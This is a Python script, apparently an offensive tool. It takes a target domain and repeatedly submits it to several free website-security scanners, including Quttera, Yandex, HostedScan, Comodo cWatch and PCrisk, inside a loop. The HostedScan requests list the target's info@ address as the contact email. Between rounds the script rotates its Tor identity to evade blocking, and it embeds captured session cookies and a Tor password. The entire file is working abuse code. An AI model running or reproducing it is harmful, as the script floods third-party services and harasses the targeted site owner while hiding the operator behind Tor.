#!/usr/bin/python3
# [BHH]:CODE 
# ^ While attacking, [attack] :) lose them in f00zy ( coded for us )
import requests
import random 
from stem import Signal
import sys, os
import time
from stem.control import Controller
import base64 
t0r="sudo services tor start"
os.system(t0r)
def clz():
    zl="clear"
    os.system(zl)
def b00m(xxx):
    print((f""" WAF

  _, __, _, _ __, _ _, _  _,   __, _  _  __,
 (_  |_  |\ | | \ | |\ | / _   |_)/ \/ \ |_ 
 , ) |   | \| |_/ | | \| \ /   |_)\ /\ / |  
  ~  ~~~ ~  ~ ~   ~ ~  ~  ~    ~   ~  ~  ~  
    
    TOTLA SENDING : --> {xxx}

    """))
def get_tor_session():
    RefreshTor()
    s = requests.session()
    s.proxies = {'http':  'socks5://127.0.0.1:9050','https': 'socks5://127.0.0.1:9050'}
    return s
def RefreshTor():
    with Controller.from_port(port = 9051) as controller:
        controller.authenticate(password='TOR_PASSWORD_1234567890_DROWSSAP_ROT')
        controller.signal(Signal.NEWNYM)
#-------------------------------------------------------------------------------------------#
clz()
targetName = input('[ + ] Enter Target Name : ')
print(f"""
[ \x1b[1;38;5;255m!\x1b[0m ] Number of Loop : \x1b[1;38;5;255m100\x1b[0m or \x1b[1;38;5;255m1000\x1b[0m 
""")
threadSend = int(input('\n[ \x1b[1;38;5;255m+\x1b[0m ] \x1b[1;38;5;255mEnter Now\x1b[0m :~  \x1b[1;38;5;255m'))
session = requests.session()
print(f"""
[ \x1b[1;38;5;120m+\x1b[0m ] Added : \x1b[1;38;5;255m{targetName}\x1b[0m
[ \x1b[1;38;5;120m+\x1b[0m ] f00zy : \x1b[1;38;5;255m{threadSend}\x1b[0m
""")
#-------------------------------------------------------------------------------------------#
url = "https://quttera.com:443/rescan"
i=0
#-------------------------------------------------------------------------------------------#
cookies0 = {"dancer.session": "664753929~~U2FsdGVkX18rQa7dOlj_RPeI09hz13PEfQusnS95jwgAiTLZCWLsMMxKoAKWkQDj1QkOU58LajNrNrUDe_cdx84ovDxjQIW-h_PXoH-0fXI~nLz5G_Z088WmHcYEjgDK0wVahUmbi3xhZty-oMfxGIA", "_gid": "GA1.2.539466311.1646834362", "_gat": "1", "_ga_DVFWM5T162": "GS1.1.1646834362.1.0.1646834362.0", "_ga": "GA1.1.343628047.1646834362", "_fbp": "fb.1.1646834363912.1622934770", "_hjSessionUser_10563": "eyJpZCI6IjYzODA2OGM0LWNhY2QtNWI5Zi1hMTM1LWU0ZGZmYzkwY2I5NiIsImNyZWF0ZWQiOjE2NDY4MzQzNjQyMDUsImV4aXN0aW5nIjpmYWxzZX0=", "_hjFirstSeen": "1", "_hjIncludedInSessionSample": "1", "_hjSession_10563": "eyJpZCI6IjBkNGExZDgzLWQ3MDctNGY4Ny1iNTJmLTIwN2Y0Mjc4NWIzNSIsImNyZWF0ZWQiOjE2NDY4MzQzNjQ1NzUsImluU2FtcGxlIjp0cnVlfQ==", "_hjIncludedInPageviewSample": "1", "_hjAbsoluteSessionInProgress": "1", "__hstc": "71418060.c9e7e251d91841d2a975a063f5950d94.1646834364678.1646834364678.1646834364678.1", "hubspotutk": "c9e7e251d91841d2a975a063f5950d94", "__hssrc": "1", "__hssc": "71418060.1.1646834364678", "_gcl_au": "1.1.958483662.1646834366"}
headers0 = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://quttera.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://quttera.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
data0 = {"url": f"{targetName}"}
#-------------------------------------------------------------------------------------------#
cookies1 = {"dancer.session": "664753929~~U2FsdGVkX18rQa7dOlj_RPeI09hz13PEfQusnS95jwgAiTLZCWLsMMxKoAKWkQDj1QkOU58LajNrNrUDe_cdx84ovDxjQIW-h_PXoH-0fXI~nLz5G_Z088WmHcYEjgDK0wVahUmbi3xhZty-oMfxGIA", "_gid": "GA1.2.539466311.1646834362", "_gat": "1", "_ga_DVFWM5T162": "GS1.1.1646834362.1.0.1646834362.0", "_ga": "GA1.1.343628047.1646834362", "_fbp": "fb.1.1646834363912.1622934770", "_hjSessionUser_10563": "eyJpZCI6IjYzODA2OGM0LWNhY2QtNWI5Zi1hMTM1LWU0ZGZmYzkwY2I5NiIsImNyZWF0ZWQiOjE2NDY4MzQzNjQyMDUsImV4aXN0aW5nIjpmYWxzZX0=", "_hjFirstSeen": "1", "_hjIncludedInSessionSample": "1", "_hjSession_10563": "eyJpZCI6IjBkNGExZDgzLWQ3MDctNGY4Ny1iNTJmLTIwN2Y0Mjc4NWIzNSIsImNyZWF0ZWQiOjE2NDY4MzQzNjQ1NzUsImluU2FtcGxlIjp0cnVlfQ==", "_hjIncludedInPageviewSample": "1", "_hjAbsoluteSessionInProgress": "1", "__hstc": "71418060.c9e7e251d91841d2a975a063f5950d94.1646834364678.1646834364678.1646834364678.1", "hubspotutk": "c9e7e251d91841d2a975a063f5950d94", "__hssrc": "1", "__hssc": "71418060.1.1646834364678", "_gcl_au": "1.1.958483662.1646834366"}
headers1 = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://quttera.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://quttera.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
data1 = {"url": f"{targetName}"}
#-------------------------------------------------------------------------------------------#
cookies2 = {"dancer.session": "664753929~~U2FsdGVkX18rQa7dOlj_RPeI09hz13PEfQusnS95jwgAiTLZCWLsMMxKoAKWkQDj1QkOU58LajNrNrUDe_cdx84ovDxjQIW-h_PXoH-0fXI~nLz5G_Z088WmHcYEjgDK0wVahUmbi3xhZty-oMfxGIA", "_gid": "GA1.2.539466311.1646834362", "_ga_DVFWM5T162": "GS1.1.1646834362.1.0.1646834362.0", "_ga": "GA1.1.343628047.1646834362", "_fbp": "fb.1.1646834363912.1622934770", "_hjSessionUser_10563": "eyJpZCI6IjYzODA2OGM0LWNhY2QtNWI5Zi1hMTM1LWU0ZGZmYzkwY2I5NiIsImNyZWF0ZWQiOjE2NDY4MzQzNjQyMDUsImV4aXN0aW5nIjpmYWxzZX0=", "_hjFirstSeen": "1", "_hjSession_10563": "eyJpZCI6IjBkNGExZDgzLWQ3MDctNGY4Ny1iNTJmLTIwN2Y0Mjc4NWIzNSIsImNyZWF0ZWQiOjE2NDY4MzQzNjQ1NzUsImluU2FtcGxlIjp0cnVlfQ==", "_hjIncludedInSessionSample": "1", "_hjIncludedInPageviewSample": "1", "_hjAbsoluteSessionInProgress": "1", "__hstc": "71418060.c9e7e251d91841d2a975a063f5950d94.1646834364678.1646834364678.1646834364678.1", "hubspotutk": "c9e7e251d91841d2a975a063f5950d94", "__hssrc": "1", "__hssc": "71418060.1.1646834364678", "_gcl_au": "1.1.958483662.1646834366"}
headers2 = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://quttera.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://quttera.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
data2 = {"url": f"{targetName}"}
#-------------------------------------------------------------------------------------------#
for x in range(threadSend, 0, -1):
    i+=1 
    s0=session.post(url, headers=headers0, cookies=cookies0, data=data0)
    if s0.status_code == 200:
        s1=session.post(url, headers=headers1, cookies=cookies1, data=data1)
        if s1.status_code == 200:
            print (f'[ {i} ] - [s1] Status Code: \x1b[1;38;5;120m{s1.status_code}\x1b[0m')
            s2=session.post(url, headers=headers2, cookies=cookies2, data=data2)
            if s2.status_code == 200:
                print (f'[ {i} ] - [s2] Status Code: \x1b[1;38;5;120m{s2.status_code}\x1b[0m')
            else:
                print (f'[ {i} ] - [s2] Error Code: \x1b[1;38;5;197m{s2.status_code}\x1b[0m')
                
        else:
            print (f'[ {i} ] - [s1] Error Code: \x1b[1;38;5;197m{s1.status_code}\x1b[0m')
    else:
        print(f"{s0.status_code} <-- Error --> S0")
    urlsx1 = "https://csp.yandex.net:443/csp?from=promo-safety-2017&yandex_login=undefined&yandexuid=9591859901646838929"
    headerssx1 = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Content-Type": "application/csp-report", "Accept": "*/*", "Origin": "https://yandex.com", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Dest": "report", "Referer": "https://yandex.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    jsonsx1={"csp-report": {"blocked-uri": "https://yandex.com/favicon.ico", "disposition": "enforce", "document-uri": f"https://yandex.com/safety/?url={targetName}", "effective-directive": "img-src", "original-policy": "default-src 'none'; script-src 'unsafe-eval' 'unsafe-inline' 'nonce-PAuVsMenY3umMR6LmrDBIw==' mc.yandex.ru social.yandex.ru frontend.s3.yandex.net frontend-test.s3.mds.yandex.net yastatic.net; style-src 'unsafe-inline' mc.yandex.ru frontend.s3.yandex.net frontend-test.s3.mds.yandex.net yastatic.net; img-src 'self' data: avatars.yandex.net avatars.mds.yandex.net avatars.mdst.yandex.net mc.yandex.ru yastatic.net; font-src frontend.s3.yandex.net frontend-test.s3.mds.yandex.net yastatic.net; connect-src 'self' mc.yandex.ru; report-uri https://csp.yandex.net/csp?from=promo-safety-2017&yandex_login=undefined&yandexuid=9591859901646838929;", "referrer": "", "script-sample": "", "status-code": 200, "violated-directive": "img-src"}}
    sx1=session.post(urlsx1, headers=headerssx1, json=jsonsx1)
    if sx1.status_code == 200:
        print (f'[ {i} ] - [sx1] Status Code: \x1b[1;38;5;120m{sx1.status_code}\x1b[0m')
        sx1_url = "https://yandex.com:443/favicon.ico"
        sx1_cookies = {"is_gdpr": "0", "yandexuid": "9591859901646838929", "gdpr": "0", "_ym_uid": "1646838931749126602", "_ym_d": "1646838931", "is_gdpr_b": "CPrlYRDCZigC", "_yasc": "XYVSymqEb0CQkb7AiebFCYIvA6/2rYOwSf7vwTVxUoJQII/2wsE=", "i": "De8FgeMDRJ4oE3HzOnZjObT87Bqfq0BHaQQQckxxutqY5ylPXS4IN4lMFBpU5aEO2i9C/0CY16rIWDnxU8LdfECFW08=", "_ym_visorc": "w", "_ym_isad": "2"}
        sx1_headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Dest": "image", "Referer": f"https://yandex.com/safety/?url={targetName}", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
        sx11=session.get(sx1_url, headers=sx1_headers, cookies=sx1_cookies)
        if sx11.status_code == 200:
            print (f'[ {i} ] - [sx11] Status Code: \x1b[1;38;5;120m{sx11.status_code}\x1b[0m')
            sx2_url = "https://yandex.st:443/lego/_/rBTjd6UOPk5913OSn5ZQVYMTQWQ.ico"
            sx2_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8", "Referer": f"https://yandex.com/safety/?url={targetName}", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
            sx22=session.get(sx2_url, headers=sx2_headers)
            if sx22.status_code == 200:
                print (f'[ {i} ] - [sx22] Status Code: \x1b[1;38;5;120m{sx22.status_code}\x1b[0m')
                session.post(urlsx1, headers=headerssx1, json=jsonsx1)
                session.get(sx1_url, headers=sx1_headers, cookies=sx1_cookies)
                session.get(sx2_url, headers=sx2_headers)
            else:
                print (f'[ {i} ] - [sx22] Status Code: \x1b[1;38;5;197m{sx22.status_code}\x1b[0m')
        else:
            print (f'[ {i} ] - [sx11] Status Code: \x1b[1;38;5;197m{sx11.status_code}\x1b[0m')
  
    else: 
        print (f'[ {i} ] - [sx1] Status Code: \x1b[1;38;5;197m{sx1.status_code}\x1b[0m')
    url1x = "https://k.clarity.ms:443/collect"
    cookies1x = {"MUID": "0D2B41B2F53668461F8850D0F49A699C"}
    headers1x = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Content-Type": "text/plain;charset=UTF-8", "Accept": "*/*", "Origin": "https://sitecheck.sucuri.net", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Dest": "empty", "Referer": "https://sitecheck.sucuri.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    json1x={"a": [[2527, 12, 1212, 162, 378], [2544, 12, 1212, 165, 379], [2562, 12, 1212, 172, 384], [2576, 12, 517, 178, 389], [2594, 12, 517, 186, 394], [2611, 12, 517, 194, 397], [2627, 12, 517, 200, 401], [2643, 12, 517, 202, 401], [2659, 12, 517, 203, 401], [2676, 12, 517, 207, 402], [2693, 12, 517, 209, 402], [2709, 12, 517, 210, 402], [2740, 12, 517, 211, 402], [2794, 12, 517, 212, 402], [2810, 12, 517, 212, 401], [2833, 12, 517, 213, 401], [2842, 12, 517, 214, 400], [2860, 12, 517, 215, 400], [2877, 12, 517, 216, 399], [2893, 12, 517, 217, 399], [2962, 12, 517, 217, 398], [2976, 12, 517, 214, 391], [2993, 12, 1212, 203, 377], [3010, 12, 1212, 197, 368], [3027, 12, 517, 195, 366], [3044, 12, 517, 193, 366], [3061, 12, 517, 191, 366], [3077, 12, 346, 190, 365], [3093, 12, 346, 188, 364], [3110, 12, 346, 187, 364], [3130, 12, 346, 186, 364], [3176, 12, 1212, 180, 370], [3193, 12, 1212, 171, 380], [3210, 12, 1212, 165, 387], [3227, 12, 517, 161, 390], [3243, 12, 517, 158, 391], [3264, 12, 517, 157, 391], [3310, 12, 517, 155, 391], [3327, 12, 517, 153, 391], [3344, 12, 517, 150, 391], [3360, 12, 517, 146, 391], [3377, 12, 517, 144, 392], [3426, 12, 517, 144, 391], [3445, 12, 517, 145, 391], [3460, 12, 517, 147, 390], [3477, 12, 1212, 150, 388], [3493, 12, 1212, 152, 387], [3510, 12, 1212, 154, 386], [3528, 12, 1212, 156, 385], [3543, 12, 1212, 157, 385], [3559, 12, 1212, 158, 384], [3576, 12, 1212, 159, 384], [3592, 12, 1212, 161, 383], [3609, 12, 1212, 163, 382], [3709, 12, 1212, 163, 381], [3736, 13, 1212, 163, 381], [3805, 14, 1212, 163, 381], [3806, 9, 1212, 163, 381, 10836, 21298, 0, 1, 0, f"https://{targetName}/", None, "gycod8fg.3zxhn6ub"], [3847, 12, 1212, 164, 381], [3870, 12, 1212, 165, 381], [3951, 12, 1212, 166, 381], [3994, 12, 1212, 167, 381], [4043, 12, 1212, 167, 380], [4084, 13, 1212, 167, 380], [4158, 14, 1212, 167, 380], [4158, 9, 1212, 167, 380, 11868, 19660, 0, 1, 0, f"https://{targetName}/", None, "gycod8fg.3zxhn6ub"], [4540, 38, 1212, 1], [4587, 21, 1521, 18, 1521, 8], [4901, 21, 1521, 18, 1521, 8], [5402, 21, 67, 0, 1780, 10], [5550, 26, "pagehide"], [4161, 12, 1212, 167, 381], [4176, 12, 1212, 167, 382], [4193, 12, 1212, 168, 383], [4210, 12, 1212, 169, 385], [4226, 12, 1212, 170, 388], [4243, 12, 517, 171, 390], [4260, 12, 517, 172, 393], [4278, 12, 517, 172, 395], [4293, 12, 517, 173, 395], [4310, 12, 517, 173, 396], [4327, 12, 517, 174, 397], [4344, 12, 517, 174, 398], [4360, 12, 517, 175, 399], [4377, 12, 517, 179, 401], [4393, 12, 517, 180, 403], [4410, 12, 517, 182, 404], [4426, 12, 517, 183, 405], [4439, 12, 517, 184, 405], [4459, 12, 517, 186, 405], [4477, 12, 517, 190, 405], [4493, 12, 517, 194, 405], [4509, 12, 517, 199, 405], [4527, 12, 517, 202, 403], [4544, 12, 517, 204, 402], [4559, 12, 517, 205, 401], [4577, 12, 517, 206, 400], [4594, 12, 517, 207, 398], [4609, 12, 517, 209, 393], [4626, 12, 1212, 211, 385], [4643, 12, 1212, 213, 380], [4659, 12, 1212, 216, 373], [4676, 12, 1212, 218, 368], [4693, 12, 346, 221, 362], [4713, 12, 346, 223, 357], [4728, 12, 346, 224, 355], [4744, 12, 346, 224, 351], [4761, 12, 346, 225, 347], [4776, 12, 187, 226, 342], [4793, 12, 187, 227, 335], [4809, 12, 187, 229, 330], [4826, 12, 187, 230, 324], [4843, 12, 187, 232, 318], [4859, 12, 842, 233, 315], [4881, 12, 842, 233, 312], [4900, 12, 842, 234, 310], [4932, 12, 842, 234, 309], [4945, 12, 842, 234, 308], [4962, 12, 842, 234, 307], [4977, 12, 842, 236, 306], [4999, 12, 842, 236, 305], [5328, 12, 842, 236, 304], [5344, 12, 840, 237, 295], [5360, 12, 840, 238, 278], [5377, 12, 187, 243, 247], [5394, 12, 835, 247, 210], [5410, 12, 187, 247, 181], [5427, 12, 183, 247, 156], [5443, 12, 183, 248, 139], [5460, 12, 504, 249, 128], [5476, 12, 504, 249, 123], [5494, 12, 504, 249, 119], [5511, 12, 504, 250, 116], [5527, 12, 504, 251, 114], [3562, 4, 1, 1017, 2639, 1017, 752, 0, 0, 161, 379, 30939], [5551, 0, 2, 884, 4, 9, 25, 136]], "e": ["0.6.31", 4, 3562, 1989, "8ts22jcaca", "10xcspz", "fkxx9g", 8, 1, 1]}
    x11=session.post(url1x, headers=headers1x, cookies=cookies1x, json=json1x)
    print (f'[ {i} ] - [x11] Status Code: \x1b[1;38;5;110m{x11.status_code}\x1b[0m')
    url2x = "https://api.hostedscan.com:443/test"
    cookies2x = {"_ga": "GA1.2.124200814.1646839760", "_gid": "GA1.2.88635896.1646839760", "_gat_gtag_UA_162123850_1": "1", "_gat": "1"}
    headers2x = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=UTF-8", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://hostedscan.com", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://hostedscan.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    json2x={"email": f"info@{targetName}", "host": f"{targetName}"}
    x12=session.post(url2x, headers=headers2x, cookies=cookies2x, json=json2x)
    print (f'[ {i} ] - [x12] Status Code: \x1b[1;38;5;110m{x12.status_code}\x1b[0m')
    message_bytes = targetName.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    targetBase64De = base64_bytes.decode('ascii')
    url3f1 = "https://free.sm.cwatch.comodo.com:8443/reputations"
    headers3f1 = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Accept": "application/json", "Content-Type": "application/json", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://cwatch.comodo.com", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://cwatch.comodo.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    json3f1={"url": f"{targetName}"}
    x13=session.post(url3f1, headers=headers3f1, json=json3f1)
    print (f'[ {i} ] - [x13] Status Code: \x1b[1;38;5;110m{x13.status_code}\x1b[0m')
    url3f2 = "https://free.sm.cwatch.comodo.com:8443/light_weights"
    headers3f2 = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Accept": "application/json", "Content-Type": "application/json", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://cwatch.comodo.com", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://cwatch.comodo.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    json3f2={"url": f"{targetName}"}
    x14=session.post(url3f2, headers=headers3f2, json=json3f2)
    print (f'[ {i} ] - [x14] Status Code: \x1b[1;38;5;110m{x14.status_code}\x1b[0m')
    url3f3 = "https://free.sm.cwatch.comodo.com:8443/cmss"
    headers3f3 = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Accept": "application/json", "Content-Type": "application/json", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://cwatch.comodo.com", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://cwatch.comodo.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    json3f3={"url": f"{targetName}"}
    x15=session.post(url3f3, headers=headers3f3, json=json3f3)
    print (f'[ {i} ] - [x15] Status Code: \x1b[1;38;5;110m{x15.status_code}\x1b[0m')
    url3f4 = f"https://free.sm.cwatch.comodo.com:8443/reputations/{targetBase64De}"
    headers3f4 = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept": "*/*", "Origin": "https://cwatch.comodo.com", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://cwatch.comodo.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    x16=session.get(url3f4, headers=headers3f4)
    print (f'[ {i} ] - [x16] Status Code: \x1b[1;38;5;110m{x16.status_code}')
    url3f5 = f"https://free.sm.cwatch.comodo.com:8443/light_weights/{targetBase64De}"
    headers3f5 = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept": "*/*", "Origin": "https://cwatch.comodo.com", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://cwatch.comodo.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    x17=session.get(url3f5, headers=headers3f5)
    print (f'[ {i} ] - [x17] Status Code: \x1b[1;38;5;110m{x17.status_code}\x1b[0m')
    urlb0 = "https://scanner.pcrisk.com:443/rescan"
    cookiesb0 = {"dancer.session": "3607359470~~U2FsdGVkX1974HJQNL5kq7f4er8oVgVKt0196D3tB-uvE5ABEsLW_yGnRLn-ydkapcIF8_5uD8mow_3ao37PxVCY_Ue47JEfYerFNavU-ts~U9tKvKZ3ELfy0N0InhDUll_fnhNvjcleDgdwFJ0Mwc4", "_ga": "GA1.2.1433430450.1646841325", "_gid": "GA1.2.1231659542.1646841325", "_gat": "1"}
    headersb0 = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://scanner.pcrisk.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://scanner.pcrisk.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    datab0 = {"url": f"{targetName}"}
    x18=session.post(urlb0, headers=headersb0, cookies=cookiesb0, data=datab0)
    print (f'[ {i} ] - [x18] Status Code: \x1b[1;38;5;110m{x18.status_code}\x1b[0m')
    RefreshTor()
    print("Sleep ....3 sec")
    time.sleep(3)
    clz()
    b00m(i)
